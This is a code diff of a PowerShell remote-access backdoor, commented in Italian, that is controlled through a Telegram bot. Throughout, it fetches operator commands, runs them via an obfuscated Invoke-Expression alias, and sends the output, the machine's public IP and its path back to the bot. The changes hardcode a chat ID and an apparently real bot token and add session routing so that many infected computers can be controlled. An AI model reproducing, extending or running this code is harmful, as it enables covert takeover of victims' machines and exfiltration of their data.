@@ -11,13 +11,14 @@ Set-Location -Path $env:USERPROFILE
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 
 # Imposta variabili per l'ID e il token dell'API di Telegram
-$telegram_id, $api_token = "@1", "@2"
+$telegram_id, $api_token = "893881631", "7673286176:AAHPHiMVPDFKo4wilqYnSZFUsCVcX3lpN8o"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
 $api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
 $api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
 $api_get_me         = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
+$session_id         = $env:COMPUTERNAME
 
 # Imposta la variabile di preferenza globale $ProgressPreference su 'SilentlyContinue'
 $Global:ProgressPreference = 'SilentlyContinue'
@@ -106,7 +107,7 @@ function SendMessage($output, $cmd)
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`COMPUTERNAME: $env:COMPUTERNAME`n`USERNAME: $env:USERNAME`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
+        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`SESSION ID: $session_id`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
     }
 
     # Converte le informazioni in formato JSON
@@ -159,9 +160,20 @@ function CommandListener
                 $username   = $message.chat.username
                 $text       = $message.text
                 $document   = $message.document
+                $sid        = $text.Split(" ")
+                $text       = $sid[1..($sid.Length - 1)] -join " "
+
+                if ($text -match "/online") {
+                    SendMessage "Sessione operativa" $text
+                }
+
+                if ($sid[0] -notmatch $session_id) { 
+                    Start-Sleep -Milliseconds 1000
+                    continue 
+                } # Se il session_id non è quello del computer allora riprende il loop
 
                 if ($text -match "exit") {
-                    SendMessage "Sessione chiusa"
+                    SendMessage "Sessione chiusa" $text
                     exit
                 }
 
@@ -172,13 +184,13 @@ function CommandListener
                             $change_location_check = $text -split ' ' | Select-Object -First 1
                             if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                             # Esegue l'istruzione
-                            $output = .(gal ?e[?x])($text) | Out-String
+                            $output = .(Get-Alias ?e[?x])($text) | Out-String
                         } 
                         catch { $output = $Error[0] | Out-String }
 
                         # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
-                        $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
-                            $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
+                        $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4095) {
+                            $output.Substring($i, [Math]::Min(4095, $output.Length - $i))
                         }
 
                         # Invia ciascun blocco di output come messaggio separato
